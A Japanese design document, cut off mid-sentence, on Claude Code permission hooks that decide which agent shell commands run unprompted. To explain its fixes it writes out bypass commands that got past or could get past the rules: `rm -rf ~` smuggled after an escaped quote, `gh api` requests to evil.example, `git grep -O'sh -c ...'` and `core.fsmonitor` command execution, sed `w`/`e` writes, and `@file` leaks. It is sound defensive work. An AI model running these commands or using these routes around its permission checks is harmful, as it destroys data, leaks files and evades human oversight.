# Claude Code の hook permission 仕様

`.claude/hooks/segment-allow.sh` を始めとする permission 関連 hook の挙動と運用ルール。
hook を新規追加・改修するとき、`permissions.allow` を触るときに参照する。

## hook の種類

- **PreToolUse**: 全ツール呼出で発火。allow を ask / deny に「厳しくする」方向のみ有効。静的 `ask` を `allow` に緩めることはできない
- **PostToolUse**: ツール呼出完了後に発火。結果の後処理・ログ記録などに使う。permission 決定には関与しない
- **PermissionRequest**: 静的 `ask` が確定した瞬間にだけ発火。**`ask` を `allow` に緩める唯一の方法**（ask を答える役）。**ヘッドレス (`claude -p`) では発火しない**（公式明記。2026-07 確認）
- **Stop**: Claude がターンを終了した直後に発火。セッション終了通知など副作用に使う。permission 決定には関与しない
- **SessionEnd**: セッション終了直後に発火する副作用 hook（ブロック不可）。入力 JSON は `session_id` / `transcript_path`（絶対パス）/ `cwd` / `reason`。matcher に reason（`clear|resume|logout|prompt_input_exit|bypass_permissions_disabled|other`）を指定できる。**ヘッドレスでも発火する**（reason: `prompt_input_exit`）ので、hook からヘッドレス claude を起動する構成では自己ループ防止の除外ガードが要る（例: `reflect-enqueue.sh` の `REFLECT_HEADLESS`）
  - reason=`resume` は**対話中の `/resume` 切替で「離脱する側」のライブセッション**に発火する（hooks.md の Reason 表 "Session switched via interactive /resume"。CHANGELOG v2.1.79 の修正エントリも同前提）。resume される側は SessionStart（source=`resume`）
  - resume は新セッションを作らず**同一 session-id・同一 jsonl に追記**して続く（2026-07 実測）。つまり reason=`resume` 時点の transcript は「その会話の最終版」とは限らず、後日同じ id のまま伸びうる
- PreToolUse / PermissionRequest の両者で `deny` は返せるが、静的 `deny` は hook 発火前に終了するため緩められない

## 典型パターン

- 「デフォ allow + 危険なパターンだけ hook で ask/deny 格上げ」→ PreToolUse（実例: `escalate-unsafe-bash.sh`。`find -exec`/`-delete`・非 localhost 宛て `curl`・dotfiles 外の skills スクリプト実行を ask に格上げ。`--self-test` あり / `pr-comment-signature.sh`。後述）
- 「デフォ ask + 安全なパターンだけ hook で allow に素通し」→ PermissionRequest（実例: `segment-allow.sh` / `scratchpad-rm-allow.sh`）

hook handler には `if` フィールドで permission rule 構文の絞り込みを書ける（`"if": "Bash(rm *)"`）。1 handler に 1 ルールだけで `&&`/リスト構文は無い（複数条件は handler を分ける）。マッチしないときはプロセスを起動しないので、同じ matcher に用途別の handler を並べてよい。ただしコマンドがパースできないと fail open（`if` を無視して起動）するため、hook 側の判定は `if` に依存せず単独で完結させる。

## 応答 JSON の形式（はまりポイント）

- PreToolUse: `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"|"deny"|"ask"}}`
- PermissionRequest: `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow","message":"..."}}}`
- PostToolUse: `{"hookSpecificOutput":{"hookEventName":"PostToolUse","additionalContext":"モデルに注入するメッセージ"}}` / 結果を差し替えるときは `"updatedToolOutput":{...}`
- 素通ししたい（判定せず静的ルールに任せる）ときはいずれも `{}` を返す

## 複数ワイルドカードパターンの末尾 ` *` は空にマッチしない

`Bash(git -C * diff *)` のように `*` を 2 つ以上含むパターンは素の glob として評価され、末尾の ` *` が「スペース + 1 文字以上」を要求する。そのため末尾引数なしの `git -C /path diff` にはマッチせず ask に落ちる（`git -C /path diff --stat` は通る。2026-06 実測）。単一ワイルドカードの `Bash(git status *)` 形式では公式ドキュメント通り bare `git status` にもマッチするので、この問題は複数ワイルドカード時のみ。対策として bare 実行があり得る `git -C` 系サブコマンドには末尾 ` *` なしの版 (`Bash(git -C * diff)` 等) を allow に併記している。starred 版と重複に見えるが消さないこと。

## ヘッドレス (`claude -p` + `dontAsk`) の permission 実測（2026-07）

無人実行の permission 設計で `--settings` / `--allowedTools` に頼る前に読む:

- **`ask` は scope を跨いで `allow` に勝つ**。user settings の `ask: Bash(gh api *)` は、`--settings` でコマンド完全一致の allow を渡しても `dontAsk` 下で自動拒否される（配列 union で ask は消せない）。PermissionRequest hook も `-p` では発火しないため、**静的 ask に入っている操作をヘッドレスで通す方法はない**
- **パス限定のファイルルールはマッチしない**。`Write(//abs/**)` / `Write(~/**)` / `Write(/abs/**)` のどれも `--settings` / `--allowedTools` 経由で効かなかった（パス指定なしの `Write` だけは効く）。パスを絞った書き込み許可は現状組めない
- 上記により、無人実行でモデルに書き込み・送信をさせる設計は避け、**モデルは stdout で結果を返しドライバ（claude 外のスクリプト）が副作用を実行する**構成に倒す（例: `reflect` の outbox パターン。`.claude/skills-global/reflect/run-headless.sh`）

## segment-allow.sh の safe-prefix 自動同期

`gh api ... | jq ...` のような複合コマンドは、Claude Code が `&&`/`||`/`;`/`|` で分割して各セグメントごとに静的 allow を判定する。1 つでも未許可セグメントがあると全体 ask に倒れるため、PermissionRequest hook (`.claude/hooks/segment-allow.sh`) が全セグメントを safe-prefix リストと照合し、すべて safe かつ **hook が責務を負う対象 (`gh api` / `git -C` / `git grep`) を 1 つ以上含む**ときだけ allow を返す。

safe-prefix リスト (`~/.claude/hooks/segment-allow.prefixes`) は `setup.sh` が `permissions.allow` から自動生成する:

- `Bash(cmd)` → `cmd` (exact)
- `Bash(cmd *)` → `cmd` と `cmd *` の 2 行。**bare 側を落とさないこと**: Claude Code の静的 allow は `Bash(head *)` で引数なしの `head` も通す（2026-08 実測）が、bash glob の `head *` は「空白 + 1 文字以上」を要求して bare に一致しない。bare を落とすと hook だけが静的 allow より狭くなり、`gh api ... | head` のようにパイプ末尾へ引数なしで置いた道具 (`head` / `cat` / `sort` / `uniq` / `pwd` 等) が未知セグメント扱いになって、コマンド全体が ask に落ちる
- **auto mode の分類器が通すコマンドも allow に書く**: auto mode 下では `cd` / `awk` / `basename` のように allow 外でも確認なしで通るものがある (2026-08 実測)。だが safe-prefix は `permissions.allow` からしか生成されないので hook には未知セグメントに見え、`cd <path> && gh api ...` だけが ask に落ちる。足してよいのはコマンド実行もファイル書き込みも持たないものだけ (`cd` は可。`awk` は `system()` / `> file` を持つので不可。`sed` と同様に hook 側の構造判定を書くまで allow には載せない)
  - 判定基準は「実行と書き込みを持たないか」だけでは足りない。**他の hook がパス解決に使う前提を壊さないか**も見る。`cd` は自身は無害だが後続セグメントの相対パスの意味を変えるので、`escalate-unsafe-bash.sh` が `bash */.claude/skills/*` の実体を `readlink -f` で確かめる判定と噛み合わず、`cd <第三者ディレクトリ> && bash ./.claude/skills/<name>/<file>` が「dotfiles 製スキル」と誤判定されて素通りしていた。`lib/bash-safety.sh` 側で「`cd` を含むコマンド内の相対パスは解決不能として ask」に倒して塞いである
- `Bash(cmd:*)` → `cmd` と `cmd *` の 2 行 (Claude Code の `:*` セマンティクス)
- `Bash(cmd sub *)` / `Bash(cmd sub:*)` → 多語サブコマンドにも対応 (`git status *` / `gh pr view *` 等)。こちらも bare (`git status`) と starred の 2 行
- `Bash(cmd -flag sub *)` → 2 語目以降にはフラグ (`-n1` / `-I{}` / `--no-fix`) と単独の `{}` も置ける (`xargs -n1 ls *` / `xargs -I{} cat *` / `xargs -I {} grep *`)。こちらも bare と starred の 2 行。**この形を除外しないこと**: 静的 allow に載っているのに hook 白名簿へ入らないと、`gh api ... | xargs -I{} ls` だけが ask に落ちる (hook が静的 allow より狭い状態)。xargs はオプション解釈がユーティリティ名で終わるので、末尾 `*` はユーティリティ側の引数にしか当たらず、派生した glob は静的 allow と同じ範囲に収まる
- 除外: 単語に glob メタ (`*` `?`) やパス区切り `/` が付く複合パターン — bash glob として 1 セグメント照合できないので hook の責務外 (`cat */.mirugit/*` / `pkill -f mirugit*` / `copilot --help*` / `npx eslint * --no-fix *` / `git -C * diff *`)
- `gh api` だけは hook 側で読み書きを判定する特別扱い（静的 allow には載せない）。エンドポイントの種類で `is_safe_gh_rest` / `is_safe_gh_graphql` の 2 本に分かれる。どちらも argv をトークン分割して見る（long form `--field` や連結形 `-XDELETE` / `-Ftitle=x` を正規表現では取りこぼすため）
- `is_safe_gh_rest` の条件:
  - **セグメントに `://` が現れたら無条件 unsafe**。`gh api` はエンドポイントに scheme 付き URL を書くと GitHub ではなく任意のホストへリクエストを送る（127.0.0.1 の listener で受信を実測）。`escalate-unsafe-bash.sh` が非 localhost `curl` を ask に格上げする方針と揃えるために塞ぐ。トークン位置ではなくセグメント全体を見るのは、値を取るフラグ (`-H` / `-q` / `-t`) の arity を hook が知らずに済ませるため。arity を取り違えるとエンドポイント位置の判定がずれて `gh api -H "X: y" https://evil.example/x` が素通りする
  - `--hostname*` は unsafe。`https://<指定ホスト>/api/v3/...` へ飛ぶ
  - `--input*` は unsafe（ボディ丸ごと）
  - メソッド指定 (`-X GET` / `-XGET` / `--method GET` / `--method=GET` の 4 形式) が 1 つ以上現れたら、**出現した全部が `GET` リテラル**でなければ unsafe。pflag は後勝ちなので 1 つ GET を見た時点で確定させると `-X GET -X DELETE` を通す。後勝ちの検証には実際に DELETE を飛ばす必要があるので、順序を知らなくても安全側に倒れる条件にしている。小文字 `get` も落とす（実装差を当てにしない）
  - `-f` / `--raw-field` / `-F` / `--field` は **GET が明示されているときだけ** safe。`gh api --help` に「パラメータを足すとメソッドが POST に切り替わる。GET のクエリ文字列として送るには `--method GET` を使う」と明記されている。値の検査は graphql 側と同じ `_gh_graphql_value_ok` に委ね、`@file` / `@-` を落とす（ローカルファイルの中身がクエリに乗って外部へ出る形なので GET でも通さない）
  - **クォート内に改行を含むセグメントは無条件 unsafe**（`is_safe_sed` / `is_safe_git_c` と同じ理由）。`tokenize_quoted` は改行入りトークンでも出力を改行区切りにするので、`-f 'title=x<改行>-X<改行>GET'` が「値 `title=x`」+「`-X`」+「`GET`」の 3 トークンに割れる。実際には GET 指定の無い POST（= issue を作る書き込み）なのに「GET 明示 + パラメータ」に見えて allow で通っていた
  - **短縮形の `=` 連結 (`-F=key=value`) は先頭の `=` を剥がしてから値を検査する**。pflag は `-F=key=value` を `-Fkey=value` と同じに解釈する（`gh api graphql -F=query=@file` が実際に通ることを実測）。剥がさないと値が `=key=@file` になり、`_gh_graphql_value_ok` が key を空・val を `key=@file` と読んで先頭 `@` 判定をすり抜ける。REST 側はローカルファイルの中身がクエリ文字列で外部へ出て、graphql 側はファイル本文がセグメントに現れないので `mutation` スキャンも効かず任意の mutation が通る
  - 残る誤差: 値を取るフラグの値が偶然 `-X` で次が `GET` だと GET 確定と誤判定する (`gh api -q -X GET -f k=v`)。この形は実際の gh ではエンドポイントがリテラル `GET` になり、エンドポイントを選ぶには bare トークンが 2 つ必要で gh 自身の引数個数チェックに落ちるので、書き込み先を選べない
  - 安全側の取りこぼし: `-X=GET` は実 gh では GET だが hook は値を `=GET` と読んで unsafe に倒す（`-X` は `=` 剥がしをしていない。落とす側なので放置してよい）
- `is_safe_gh_graphql` はさらに別扱い。参照クエリでも本文を `-f query=...` で渡すので、「セグメント全体に `mutation` が現れない」ことを条件に safe とする（GraphQL の書き込みは mutation operation 限定で、キーワード省略の shorthand `{...}` は spec 上 query 固定なので、この 1 語で読み書きを判別できる）。値を検査できない `--input` / `-F key=@file` / `-F key=@-` / `-F=key=@file`、送信先を差し替える `--hostname`、判定面を増やす `--method` は unsafe。`__type(name:"Mutation")` のような参照も巻き添えで ask になるが、false positive は安全側なので許容する
- `split_segments` が分割するのは `&&` / `||` / `;` / `|` / **クォート外の改行**。bash では改行はコマンド区切りそのものなので、区切らないと複数行コマンドが 1 セグメントに潰れ、下記のクォート外改行チェックに当たって中身が何であれ ask に落ちていた。分割してから 1 行ずつ白名簿を通す方が判定は精密になる（緩むのではなく、各行が個別に照合される）
- `split_segments` は NUL 区切りで返す。`-f query='<改行>...'` のようにセグメント自身が改行を含むケースがあり、改行区切りだと呼び出し側の `read -r` が 1 セグメントを分割してクエリ本文の断片を「未知のコマンド」と誤判定するため
- **クォート外の `\` は「次の 1 文字ごと持ち越す」**。`split_segments` と `has_unsafe_metachar` の両方で同じ扱いをすること。片方だけだと穴が開く:
  - `split_segments` 側で持ち越さないと、行継続 `\<改行>` を区切りと誤読し、実際には 1 コマンドの引数だったトークンが独立セグメントとして白名簿に照合されて素通りする
  - `has_unsafe_metachar` 側で読み飛ばさないと、`\"` / `\'` が擬似的なクォート区間を開き、その内側の `& > < ( )` が「クォート内だから安全」と誤判定される。`echo \"a&rm -rf ~` は bash では `echo "a` を background 実行して `rm -rf ~` を走らせるが、これで `echo *` に一致して allow になっていた
  - 行継続 `\<改行>` だけは例外で、`has_unsafe_metachar` が unsafe に倒す（セグメント内に残った改行が「実 bash では 1 コマンド」の目印なので、素通しせず ask へ送る）
- `sed` も `gh api` と同じ hook 側の特別扱い（静的 allow には載せない）。glob 照合では `sed -n '60,90p'` と `sed -i '' 's/x/y/' file` を区別できず、`Bash(sed -n *)` に絞っても `sed -n -i.bak ...` が同じ glob に一致するため。判定はブラックリストではなくホワイトリストで、**`-n`（`--quiet` / `--silent`）と「数値アドレス + `p`」のスクリプト 1 個、および入力ファイル名だけ**で構成されるときのみ safe とする。`-i` / `-I` はもちろん、スクリプト本文に隠れる `w file`・`s///w file`（任意ファイルへの書き出し）と GNU sed の `e`・`s///e`（シェルコマンド実行。BSD には無い）も、この文法では文字として現れる余地が無いので構造的に排除される。フラグを見るブラックリストだと後者を素通りさせ、実装・版が変わるたびに穴が開く
  - `-E` / `-u` のように単体では無害なフラグも受理しない。引数を取るフラグ（BSD の `-i` は拡張子、`-e` はスクリプト、`-l` は BSD では引数なしだが GNU では数値を取る）が混ざると「次のトークンは何か」の解釈が実装で食い違うため、`-n` 以外を落として arity の解釈自体を不要にしている
  - GNU sed の `--sandbox`（`e`/`w`/`r` を実行前に拒否する）は BSD sed に無いので当てにできない
  - 最終行を表す `$` は `60,$p` の形で許可（シングルクォート内なのでクォート外の `$` を弾く判定とは衝突しない）。正規表現アドレス `/re/p` は区切り文字変更やエスケープの解釈が必要で「w / e が現れない」を機械的に言えないため対象外
  - **クォート内に改行を含むセグメントは無条件で unsafe**。`tokenize_quoted` は改行入りトークンでも出力を改行区切りにするので、`sed -n '1,5p<改行>w /tmp/x'` が「スクリプト `1,5p`」+「入力ファイル名 `w /tmp/x`」の 2 トークンに割れ、実際には sed の `w`（任意ファイルへの書き出し）や GNU の `e`（シェルコマンド実行）が allow で通ってしまう。`is_safe_gh_graphql` が mutation 判定をトークン化に依存させないのと同じ罠
- さらに全セグメント共通で、クォート外に `& $ \` ( ) < > {`・改行（行継続 `\<改行>` で持ち越されたもの。素の改行は上記のとおり分割済み）が現れたら prefix が何であれ unsafe に倒す（`&`・`$()`・バッククォート・リダイレクト等は末尾 glob の prefix 照合をすり抜けるため）。例外は下記:
  - `gh api ... > /tmp/...` への保存（実運用で多用するため。リダイレクト先が /tmp 配下リテラルのときのみ）
  - リテラルの `{}`（bash のブレース展開は `{a,b}` / `{1..3}` の形でしか起きないので、`{}` は 1 語のまま残る）。`xargs -I{} cat` / `find -exec ... {}` が静的 allow に載っているため通す。逆に展開が起きる形を落とすのは、トークンの先頭を `{` にするだけでフラグを bare トークンに偽装できるため — `git grep {-O,-O}'sh -c cmd' pat` は hook のトークナイザには `{-O,-O}sh -c cmd` という 1 個の bare トークンに見えるが、実 bash では `-Osh -c cmd` へ展開されて pager 経由で任意コマンドが走る（実測。2026-09）。同じ手で `gh api {-X,-X}DELETE ...` のメソッド検査や `git -C {p,p} ...` のパス位置判定もすり抜ける
  - 単語として現れる副作用の無いリダイレクト（`2>&1` の fd 複製と、`2>/dev/null` / `1>/dev/null` / `&>/dev/null` / `>/dev/null` の出力破棄）。ファイル生成もコマンド実行も伴わず、`/dev/null` は書き込みが常に捨てられる特殊デバイスなのでリダイレクト先の変動もない。単語境界を要求するので `&>file` / `2>file` / `>&1` / `2>/dev/nullx` / `12>/dev/null` は従来通り検出される。空白入り（`2>& 1` / `2> /dev/null`。bash では合法）と、他のファイルリダイレクトとの併用は読み飛ばさず ask に落ちる

### git -C の構造判定 (`is_safe_git_c`)

`git -C <path> <サブコマンド>` は静的 allow に載せない。`Bash(git -C * status)` の `*` は
コマンド文字列全体に対する glob なので空白をまたぎ、
`git -C /tmp -c core.fsmonitor='任意コマンド' status` にも一致してしまう
(`core.fsmonitor` は status / diff / fetch / ls-files が index を更新する際に、
`diff.external` は diff 実行時に、いずれも無条件で起動される。2026-08 実測)。
Claude Code 自身も起動時に該当ルールを「サブコマンドより前のワイルドカードは
差し込まれたオプションごと承認する」と警告する。パスを実値に固定しない限り
glob では表現できないため、hook 側の構造判定に倒している。

allow を返す条件は、トークン分割した結果が下記すべてを満たすとき:

- 先頭トークンが素の `git` (`/usr/bin/git` / `command git` / `sudo git` は対象外)
- 続くトークンが `-C` ＋ パスの **1 組だけ**。`-C` より前に何か来る形 (`git -c ... -C ...`)、
  パス位置がオプションの形 (`git -C -c ...`)、連結形 (`-C/path`)、`-C` が 2 組はすべて落ちる
- サブコマンドが `status` / `log` / `diff` / `show` / `branch` / `fetch` / `remote` / `blame` /
  `rev-parse` / `ls-files` / `check-ignore` / `worktree` のいずれか。
  `stash` は直後が `list` のときだけ (引数なしの `git stash` は変更の退避＝書き込みのため)。
  **この集合は「読み取り専用」ではない** — `fetch` は ref/object を、`branch -D` は ref を、
  `remote add` / `worktree add`・`remove` はリポジトリ構成を書き換える。それでも通すのは
  `-C` なし版が静的 allow に載っているからで、追加の基準は「読み取り専用か」ではなく
  「`-C` なし版が静的 allow にあるか」
- クォート内に改行を含むセグメントは無条件で unsafe (`is_safe_sed` と同じ理由。
  `tokenize_quoted` の出力が改行区切りなのでトークン境界がずれ、サブコマンド位置を誤読する)

**サブコマンドより後ろのオプションは検査しない。** `--upload-pack` (任意コマンド実行)・
`--output` (任意パス書き込み)・`--ext-diff` はいずれも危険だが、`-C` を含まない
`Bash(git diff *)` / `Bash(git fetch *)` でも同様に通る (実測)。ここだけ絞ると同じ操作が
`-C` の有無で通ったり通らなかったりする二重基準になるので、`-C` なし版と同水準に揃えている。
後ろ側を締めるなら allow → ask の格上げ側 (PreToolUse の `escalate-unsafe-bash.sh`) の担当。
なお git は設定によるフック機構を持つため、リポジトリ自身の `.git/config` に
`diff.external` を書けばオプション無しの `git diff` でも任意コマンドが走る。
permission ルールでこの経路は閉じられない。

### git grep の構造判定 (`is_safe_git_grep`)

`git grep` も静的 allow に載せない。`Bash(git grep *)` の `*` はコマンド文字列全体に対する
glob なので空白をまたぎ、`git grep -O'sh -c "任意コマンド"' pattern` にも一致する。
`-O` (`--open-files-in-pager`) は「マッチしたファイルを pager で開く」オプションだが、
pager として渡した文字列をシェル経由で起動するため、引数だけで任意コマンドが走る
(`git grep -O'echo X' pat` で echo の実行を実測。2026-09)。`git -C` と同じく glob では
差し込みを排除できないので hook 側の構造判定に倒している。

allow を返す条件は、トークン分割した結果が下記すべてを満たすとき:

- 先頭トークンが素の `git`、次が `grep`。サブコマンド前への差し込み
  (`git -c core.pager=x grep`) と `sudo git` / `/usr/bin/git` はここで落ちる
- 以降のトークンが「値を取らないフラグ」「pathspec 区切りの `--`」「bare トークン
  (パターン / rev / pathspec)」のいずれか。bare トークンは読み取り対象を指すだけなので自由
- クォート内に改行を含むセグメントは無条件で unsafe (`is_safe_sed` / `is_safe_git_c` と同じ理由)

**ブラックリストではなくホワイトリストにする。** 「`-O` だけ落とす」形にすると、git が将来
別の実行経路を持つオプションを増やしたときに黙って穴が開く。受理するフラグを列挙して
知らないものを一律 unsafe に倒せば、増えた側は自動的に落ちる (`is_safe_sed` と同じ判断)。

**値を取るフラグ (`-e` / `-f` / `-C <n>` / `-A` / `-B` / `-m` / `--max-depth` / `--threads`) は
受理しない。** 「次のトークンは何か」の解釈が要り、arity を取り違えると値の位置に置いた
フラグが bare トークン扱いになって検査をすり抜ける (`is_safe_gh_rest` が抱えている誤差と同種)。
解釈そのものを不要にするために落としている。実ログ上の使用実績も `-n` / `-l` / `--` /
rev 指定に収まっており、実害は出ていない。

**連結短縮形は 1 文字ずつ検査する。** `-ni` のような形を受理する一方、`-nO` のように安全な
文字へ紛れ込ませる形を落とすため。

`--textconv` は入れない。リポジトリの `.gitattributes` に書かれたフィルタを起動するので
`git diff` の `diff.external` と同種だが、あちらは `-C` なし版が静的 allow に載っている
既存の受け入れで、こちらは新規に開ける口なので広げない。

`cd <path> && git grep ...` の形でも hook は起動する (2026-09 実測)。
`Bash(git grep *)` はコマンド文字列全体に対する glob なので先頭が `cd` だと
一致しないはずだが、`cd /tmp && git grep -n <語> | head -5` は確認なしで通り、
`cd /tmp && git grep -O'echo X' <語>` は確認に落ちた。安全な形と危険な形で結果が
分かれる以上、分類器が一律に通しているのではなく hook が判定している。
`if` がセグメントを見ているのか、パース失敗時の fail open で起動しているのかは
区別できていないが、実運用で多い `cd <リポジトリ> && git grep ...` が救えており、
その形でも `-O` は塞がれている。

### ヘッドレスで必要な `git -C` は実パスで allow に残す

PermissionRequest hook はヘッドレスで発火しない。`reflect` は
`claude -p --permission-mode dontAsk` で動き `git -C ~/dotfiles ls-files ...` を実行するため、
`Bash(git -C ~/dotfiles ls-files *)` だけ `settings.local/common.json` の allow に残している
(パスが実値なので Claude Code の警告対象にもならない)。同種の必要が出たら、
ワイルドカードではなく実パスで足すこと。

ただしこの allow はパスの**表記**に一致するので、`reflect/SKILL.md` が
`git -C ~/dotfiles ...` と書いている限りでしか当たらない。SKILL.md 側の表記を
絶対パスや `$HOME/dotfiles` に変えると、ヘッドレスでは hook も効かず黙って
スキル列挙が落ちる。片方を変えるときはもう片方も揃えること。

### 同じ hook を複数の `if` で登録する

`if` は 1 handler に 1 ルールしか書けないので、`segment-allow.sh` は
`Bash(gh api *)` ・ `Bash(git -C *)` ・ `Bash(git grep *)` の 3 handler で登録している。
対象を増やすときは handler を足す (`if` に `&&` やリストは書けない)。

### メンテ手順

- 新たに `gh api ... | <cmd> ...` を素通ししたい → `Bash(<cmd> *)` を allow に追加 → `./setup.sh <env>` で prefix 再生成
- `git -C` で新たなサブコマンドを通したい → `is_safe_git_c` のホワイトリストに追加 (静的 allow ではなく hook 側)
- `git grep` で新たなフラグを通したい → `is_safe_git_grep` のホワイトリストに追加。値を取るフラグを足すときは arity の解釈が要る点に注意 (現状は値を取らないフラグだけで閉じている)
- `is_safe_git_c` のサブコマンド集合に `grep` を足さないこと。あちらは「サブコマンドより後ろのオプションは検査しない」方針なので、足すと `git -C <path> grep -O'任意コマンド'` が素通りする
- hook ロジック側の self-test: `bash .claude/hooks/segment-allow.sh --self-test`
- 派生規則側の self-test: `./setup.sh --self-test` (設定は書き換えない)。hook 側の self-test は SAFE_PREFIXES を自前で手書きしており実際の派生結果を見ないので、この 2 本は別物として両方回す。片方だけだと「hook だけが静的 allow より狭い」状態が緑で通る

## scratchpad-rm-allow.sh の許可条件

`Bash(rm *)` は `settings.local/common.json` の `permissions.ask` にあり、union される ask は allow で消せない。scratchpad（`/private/tmp/claude-<uid>/<project-slug>/<session-id>/scratchpad`）配下の一時ファイル削除だけを人間ゲート無しで通すため、PermissionRequest hook (`.claude/hooks/scratchpad-rm-allow.sh`) が下記すべてを満たすときだけ allow を返す。1 つでも欠けたら `{}` を返して静的 ask に委ねる。

- コマンド全体が文字白名簿 `[A-Za-z0-9_./*?,+=:@ -]` のみ。クォート・`$`・バッククォート・`&&`/`;`/`|`/`&`・リダイレクト・改行・`~` はこの 1 本で落ちる（複合コマンドも同時に排除されるので、segment-allow.sh のような分割・トークナイズを持たずに済む）
- 入力 JSON の `tool_name` が `Bash`（`if` はコマンドをパース不能なとき fail open するので hook 側でも確かめる）
- 先頭トークンが素の `rm`（`command rm` / `/bin/rm` / `sudo rm` は対象外）
- フラグは `-[rRfvdi]+` の連結短縮形と `--` のみ。未知フラグがあれば ask
- 全オペランドが `^/private/tmp/claude-<実行ユーザの uid>/[^/]+/<hook 入力の session_id>/scratchpad/[^/].*` にマッチ。相対パスは cwd を確定できないので対象外
- パス成分がドットで始まらない（`..` はもちろん `.?` / `.*` も拒否。白名簿が `.` `?` `*` を通すので、リテラルの `..` が無くても展開時に `../..` になり prefix 照合をすり抜ける。`.` 始まりの成分は `?` / `*` にマッチしないため、`/.` を封じれば展開後も scratchpad 内に閉じる。bash 5.2+ の globskipdots や zsh は `..` を展開しないが、macOS 同梱の `/bin/bash` 3.2 は展開するのでシェル任せにしない）
- scratchpad ルート自体は対象外（`/[^/].*` を要求）。ルートが消えると以降の一時ファイル書き込みが軒並み失敗するため

`session_id` を実パスに埋めるので、並行して動く別セッションや別 uid の scratchpad は allow されない。scratchpad のパス規約が将来変わっても照合が外れて ask に落ちるだけで、安全側に倒れる。

self-test: `bash .claude/hooks/scratchpad-rm-allow.sh --self-test`

## pr-comment-signature.sh の格上げ条件

`respond-to-pr-review` / `review-comment` は返信・指摘の末尾に「空行 + Claude Code の署名」を必須としているが、スキルを経由せず `gh api` を直接叩くと規定を踏まずに投稿できてしまう。PreToolUse hook (`.claude/hooks/pr-comment-signature.sh`) が、コメント本文を送る `gh api` 呼び出しで署名を確認できないときだけ ask に格上げする。判定できないケース（本文ファイルを解決できない・入力 JSON を解釈できない）は pass ではなく ask に倒す。

対象とする投稿経路（**どれか 1 つでも落とすと一番よく使う経路が素通りする**）:

- REST: パスに `/comments` / `/replies` / `/reviews` を含み、かつ本文フィールドを渡している呼び出し。本文フィールドは `body=` だけでなく PENDING レビューを作る `-F 'comments[][body]=...'` のようなネスト形も拾う（`review-comment` の既定の投稿経路がこの形）
- GraphQL: `gh api graphql` で `mutation` と `body` を含む呼び出し（既存 PENDING レビューへ追記する `addPullRequestReviewThread` 等）。REST のパス判定に掛からないので別経路で見る。参照クエリは `mutation` が無いので対象外

`-F` / `--field` の `body=@file` だけがファイル参照なので、解決したファイルの中身を 1 件ずつ検査する（連結して見ると「どれか 1 つに署名があれば通る」抜けができる）。`-f` / `--raw-field` は `@` を展開せずリテラル `@path` を本文として送るため、ファイル参照として除外せずコマンド文字列側の署名確認に回す。

`gh api` 以外の投稿経路（`gh pr comment` / `gh pr review` / `gh issue comment`）は現状カバーしていない。

self-test: `bash .claude/hooks/pr-comment-signature.sh --self-test`

## memory-guide-gate.sh の差し戻し条件

メモリ (`~/.claude/projects/<slug>/memory/` 配下の `*.md` と `MEMORY.md` 索引) への書き込みを、
セッション内で最初の 1 回だけ deny し、`memory-guide` スキルの起動をモデルに促す
PreToolUse hook。`prefer-jq-over-python.sh` と同じく、deny の理由文だけがモデルに渡る性質を使って
人間の手を止めずに差し戻す。

**「起動済みか」は判定しない。** 検知手段がどれも取りこぼすため:

- `transcript_path` の会話ログは非同期に書かれ、現在ターンの直近メッセージを含まないことがある
  (公式明記)。grep 方式は誤 deny → 再起動 → また誤 deny のループになりうる
- ユーザが `/memory-guide` と手で打った場合はプロンプト展開でスキル本文が載るだけで、
  Skill ツール呼び出しが発生しない。Skill 呼び出しを見張る方式では印が付かず、
  正しく読んでいるのに deny される

代わりに「セッションにつき 1 回だけ立ち止まらせる」に割り切り、印ファイル
(`${TMPDIR}/claude-memory-guide-gate/<session_id>`) の有無だけで判定する。
印を置けないときは素通しに倒す (追跡できない以上、恒久 deny より安全)。対象は 2 通り:
`session_id` が想定外の形でパスを組み立てられない場合と、`mkdir` / 書き込みが失敗する場合
(TMPDIR が消えた・別ユーザ所有・容量不足)。後者で deny を返すと次回も印が無く、
「セッションにつき 1 回」のはずの差し戻しがセッション中ずっと続いてメモリを書けなくなる。

対象ツールは `Write` / `Edit` / `MultiEdit` / `NotebookEdit` に加えて **`Bash`**。auto mode では
ファイル編集を heredoc や `sed` で行うよう指示されるため、ファイル編集ツールだけを見張ると素通りする。
Bash 側の判定は「`.claude/projects/` と (`/memory/` or `MEMORY.md`) を含み、かつ
`>` / `tee` / `cp` / `mv` / `rm` / `sed -i` のいずれかを含む」という粗い痕跡判定。任意のシェルコマンドの
書き込み先は静的に決まらないので取りこぼしを減らす側に倒しており、メモリパスを引数に持つ読み取り
コマンドを巻き込むことがある。差し戻しがセッション 1 回きりなので誤検知の代償は 1 往復で頭打ちになる。

self-test: `bash .claude/hooks/memory-guide-gate.sh --self-test`

## cd-outside-workspace-gate.sh の差し戻し条件

作業ディレクトリ外へ `cd` した状態で相対パスを参照するコマンドを、セッション内で最初の 1 回だけ
deny し、絶対パスでの書き直しをモデルに促す PreToolUse hook。`prefer-jq-over-python.sh` /
`memory-guide-gate.sh` と同じ deny の型。

**確認が出るかどうかは静的に再現できない。** 実測 (2026-09。断りのない行はすべて作業ディレクトリ外へ `cd` した後):

| コマンド | 結果 |
|---|---|
| `echo ok` | 通る |
| `head -1 CLAUDE.md` | 通る |
| `grep -c dotfiles CLAUDE.md` | 通る |
| `ls src` / `ls .` | 通る |
| `head -1 ../../dotfiles/CLAUDE.md` | 通る (解決先が作業ディレクトリ内) |
| `grep -c . CLAUDE.md` | **確認が出る** |
| 複合コマンド (`cd` + `echo` + `gh issue list` + `grep` + `head`) | **確認が出る** |
| `grep -c . /abs/<外部>/CLAUDE.md` (cd 無し・絶対パス) | 通る |

「外部へ cd + 相対パス参照」では確認は出ない。単一ファイルでもディレクトリでも `.` でも通る。
`grep` は `permissions.allow` に載っているのに `grep -c . CLAUDE.md` だけが止まるので、判定して
いるのは静的ルールでも hook でもなく **auto mode の分類器**と考えるのが筋 (この文書の
safe-prefix 節に「auto mode 下では allow 外でも確認なしで通るものがある」と記録したのと同じ
仕組みが、緩める方向だけでなく厳しくする方向にも働いている)。つまり確認が出る形を hook 側で
先読みすることは原理的にできない。

**なので、この hook が deny する根拠は「確認が出るから」ではなく「書き方の規律」。** cwd を
作業ディレクトリの外へ移すと相対パスの指す先が cwd 依存になり、読み手にも後続セグメントにも
曖昧になる。絶対パスなら cwd に依存しない。書き換え先が通ることは対照実験で確認済み — 止まった
